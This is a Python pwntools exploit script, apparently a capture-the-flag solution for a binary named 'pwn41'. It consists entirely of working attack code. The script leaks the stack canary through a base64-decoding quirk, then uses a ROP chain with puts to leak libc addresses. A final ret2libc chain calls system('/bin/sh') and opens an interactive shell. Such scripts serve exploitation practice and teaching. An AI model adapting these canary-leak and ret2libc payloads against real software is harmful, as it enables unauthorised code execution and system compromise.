from pwn import *
from base64 import *

p = process('./pwn41')

libc = ELF('/usr/lib/libc.so.6')
ite = libc.search('/bin/sh')

#leak canary
f_payload  = b64encode( 'a'*90)
fl_payload  = [ i for i in f_payload ]
fl_payload[66] = '='			#cut
ff_payload  = ''.join( fl_payload )
b_payload = b64encode( ff_payload )
p.recvuntil("N]")
p.sendline('Y')
p.recvuntil("data")
p.send( b_payload )
redata = p.recvuntil('May')
stack = '\0' + redata[170:177]
canary = u64(stack)
print 'canary: ', hex(canary)


pop_rdi_ret = 0x0000000000400e93
puts_got = 0x602020
puts_plt = 0x00400790

#leak 
payload2  = 'A'*0x30
payload2 += p64(canary)
payload2 += 'B'*8
payload2 += p64(pop_rdi_ret)
payload2 += p64(puts_got)
payload2 += p64(puts_plt)
payload1  = b64encode(payload2).ljust(120, 'a')
payload0  = b64encode(payload1)
p.sendline('Y')
p.recvuntil("data")
raw_input()
p.send( payload0 )
redata = p.recvuntil('May')
puts = redata[-11:-5].ljust(8, '\0')
puts = u64(puts)
print 'puts: ',hex(puts)


libcbase = puts - libc.symbols['puts']
system = libcbase + libc.symbols['system']
sh = libcbase + ite.next()


#shell
payload2  = 'A'*0x30
payload2 += p64(canary)
payload2 += 'B'*8
payload2 += p64(pop_rdi_ret)
payload2 += p64(sh)
payload2 += p64(system)
payload1  = b64encode(payload2).ljust(120, 'a')
payload0  = b64encode(payload1)
p.sendline('Y')
p.recvuntil("data")
raw_input()
p.send( payload0 )

p.interactive()


